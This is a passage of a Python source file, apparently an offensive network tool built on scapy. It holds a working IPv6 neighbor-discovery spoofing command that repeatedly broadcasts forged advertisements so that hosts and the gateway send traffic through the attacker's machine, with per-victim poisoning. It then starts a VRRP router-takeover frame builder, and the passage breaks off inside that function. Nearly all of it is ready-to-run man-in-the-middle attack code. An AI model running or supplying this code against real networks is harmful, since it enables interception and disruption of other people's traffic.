# ---------------------------------------------------------------- ndpspoof


def ndpspoof_cmd(args):
    need_root()
    iface = args.iface
    m = my_mac(iface)
    gw6 = args.gw
    if not gw6:
        gw4 = gateway_of(iface) or "172.16.0.1"
        gw4m = resolve_mac(gw4, iface)
        if not gw4m:
            die("cannot resolve gateway MAC; pass --gw <link-local>")
        gw6 = ll6_from_mac(gw4m)
        print(f"[*] derived gateway link-local {gw6} from {gw4} ({gw4m})")
    pois = Ether(src=m, dst="33:33:00:00:00:01") / \
        IPv6(src=gw6, dst="ff02::1", hlim=255) / \
        ICMPv6ND_NA(R=0, S=0, O=1, tgt=gw6) / \
        ICMPv6NDOptDstLLAddr(lladdr=m)
    frames = [pois]
    tlist = args.targets or []
    if tlist and args.gw_mac:
        for t in tlist:
            frames.append(Ether(src=m, dst=args.gw_mac) /
                          IPv6(src=t, dst=gw6, hlim=255) /
                          ICMPv6ND_NA(R=0, S=0, O=1, tgt=t) /
                          ICMPv6NDOptDstLLAddr(lladdr=m))
    print(f"[*] NDP poison on {iface}: '{gw6} is-at {m}' to all nodes"
          + (f" + gw-side for {len(tlist)} victims" if len(frames) > 1 else ""))
    try:
        while True:
            sendp(frames, iface=iface, verbose=0)
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print("\n[*] stopped (victim caches recover via NUD)")


# ---------------------------------------------------------------- vrrp


def vrrp_frame(m, myip, vrid, priority, vips, adv=1):
    return (Ether(src=m, dst="01:00:5e:00:00:12") /
            IP(src=myip, dst="224.0.0.18", ttl=255) /
            VRRP(version=2, type=1, vrid=vrid, priority=priority,
                 ipcount=len(vips), adv=adv, addrlist=vips))


def vrrp_cmd(args):
    need_root()
    if not HAVE_VRRP:
        die("scapy VRRP layer unavailable")
    iface = args.iface
